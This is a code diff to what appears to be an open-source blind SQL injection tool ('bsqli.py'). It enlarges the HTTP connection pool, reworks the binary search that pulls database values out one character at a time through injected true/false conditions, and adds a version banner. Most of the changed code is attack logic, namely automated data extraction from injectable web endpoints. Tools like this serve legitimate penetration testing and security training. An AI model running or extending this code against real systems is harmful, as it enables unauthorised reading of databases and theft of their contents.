@@ -23,7 +23,7 @@ import copy
 import random
 
 
-VERSION = '0.5.1'
+VERSION = '0.5.2'
 
 logging.basicConfig(format='[%(levelname)s] %(message)s')
 urllib3.disable_warnings()
@@ -121,8 +121,10 @@ def make_session(max_retries: int, proxy: Optional[str]) -> requests.Session:
         redirect=0,
         backoff_factor=0.2,
     )
-    s.mount('http://', requests.adapters.HTTPAdapter(max_retries=retries))
-    s.mount('https://', requests.adapters.HTTPAdapter(max_retries=retries))
+    pool_size = 100
+    adapter = requests.adapters.HTTPAdapter(max_retries=retries, pool_connections=pool_size, pool_maxsize=pool_size)
+    s.mount('http://', adapter)
+    s.mount('https://', adapter)
     if proxy is not None:
         s.proxies.update({
             'http': proxy,
@@ -253,17 +255,20 @@ class SQLStringBrute:
         The query should return one integer.
         For strings, use ASCII(SUBSTRING(s, offset, 1)).
         """
-        prev = None  # Previous guess.
+        # prev = None  # Previous guess.
 
         if not self.sender.send(cond=f'{sql}<{max}'):
             # Not even within range?
             return None
         
-        if not self.sender.send(cond=f'{sql}>={min}'):
+        if self.sender.send(cond=f'{sql}<{min}'):
             return None
 
-        while min <= max:
+        while min < max:
             mid = (min + max) // 2
+            
+            if mid == min:
+                return mid
 
             if task is not None:
                 self.prog.update(task, value=mid, advance=1)
@@ -273,15 +278,13 @@ class SQLStringBrute:
             else:
                 logging.debug(f'{index}: {mid}')
 
-            if mid == prev:
-                return mid
 
             if self.sender.send(cond=f'{sql}<{mid}'):
                 # Len is upper bound.
                 max = mid
             else:
                 min = mid
-            prev = mid
+            # prev = mid
             
         return None
 
@@ -722,9 +725,12 @@ def main():
                         help='If the provided text was NOT encountered in the response body, mark the query as an error. Accepts multiple arguments.')
     
     parser.add_argument('--cast-to-string', action='store_true',
-                        help='Cast the target output to varchar(2048) string. This allows numbers to be output as well, since normally we can\'t SUBSTRING a number.')
+                        help='Cast the target output to varchar(2048) string. This allows numbers and other data types to be treated as strings, so that our standard ASCII-SUBSTRING algorithm can work.')
     parser.add_argument('--cast-to-string-length', default=2048, type=int,
                         help='The length of the string to cast to. If you specify this, you should also enable --cast-to-string.')
+    
+    # TODO: unicode support
+    # TODO: improve table enumeration
     
     # Primary console colour.
     parser.add_argument('--color-primary', default=Palette.primary, help=argparse.SUPPRESS)
@@ -753,7 +759,7 @@ def main():
     if args.url is None:
         parser.print_help()
         return 1
-
+    
     match args.v:
         case 0:
             logging.getLogger().setLevel(logging.WARNING)
@@ -766,6 +772,10 @@ def main():
     COND_TOKEN = args.cond_token
     Palette.primary = args.color_primary
     Palette.highlight = args.color_highlight
+
+    console.print()
+    console.print('-- @TrebledJ/bsqli.py --', style=Palette.primary)
+    console.print(f'{"v" + VERSION:->22}--', style=Palette.primary, highlight=False)
 
     match args.strategy:
         case "B":
